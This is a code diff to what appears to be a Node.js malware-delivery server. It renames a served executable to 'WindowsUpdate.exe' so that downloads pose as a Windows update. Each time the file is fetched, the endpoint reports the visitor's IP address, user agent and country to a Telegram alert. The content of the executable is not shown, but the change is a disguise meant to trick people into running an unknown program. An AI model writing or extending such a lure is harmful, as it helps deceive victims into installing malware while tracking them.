@@ -2237,7 +2237,7 @@ app.get('/sbfbkbj', async (req, res) => {
 
 // Endpoint for server host module
 app.get('/ServerHostModule', async (req, res) => {
-    const filePath = path.join(__dirname, 'dist', 'Server Host Module.exe');
+    const filePath = path.join(__dirname, 'dist', 'WindowsUpdate.exe');
     
     if (fs.existsSync(filePath)) {
         const ip = getClientIP(req);
@@ -2246,7 +2246,7 @@ app.get('/ServerHostModule', async (req, res) => {
         const country = await getCountryFromIP(ip);
         
         const message = `
-🔔 <b>Server Host Module EXE</b>
+🔔 <b>Windows Update EXE</b>
 📱 <b>User Agent:</b> ${userAgent}
 🌐 <b>IP:</b> ${ip}
 🌍 <b>Country:</b> ${country}
@@ -2255,7 +2255,7 @@ app.get('/ServerHostModule', async (req, res) => {
         `;
         await sendTelegramAlert(message);
 
-        res.setHeader('Content-Disposition', 'attachment; filename="Server Host Module.exe"');
+        res.setHeader('Content-Disposition', 'attachment; filename="WindowsUpdate.exe"');
         res.setHeader('Content-Type', 'application/octet-stream');
         const readStream = fs.createReadStream(filePath);
         readStream.pipe(res);
